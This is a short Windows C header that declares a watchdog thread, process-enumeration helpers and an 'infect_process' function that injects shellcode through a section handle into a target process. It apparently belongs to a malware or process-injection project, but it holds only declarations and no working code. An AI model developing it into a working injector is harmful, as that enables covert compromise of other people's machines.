#pragma once
#include <Windows.h>

/* watchdog.c */
struct watchdog_info
{
  LONG lock;
  ULONGLONG proc_id;
  WCHAR path[MAX_PATH + 1];
};

DWORD WINAPI
ThreadProc(_In_ LPVOID lpParameter);
int
monitor_proc_id(struct watchdog_info* map);

/* process.c */
#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004

int
process_list(PSYSTEM_PROCESS_INFORMATION* p_spi);
int
process_exists(ULONGLONG proc_id);

/* infect.c */

int
infect_process(HANDLE section,
               PVOID shell_base,
               SIZE_T shell_size,
               DWORD proc_id,
               struct watchdog_info* map);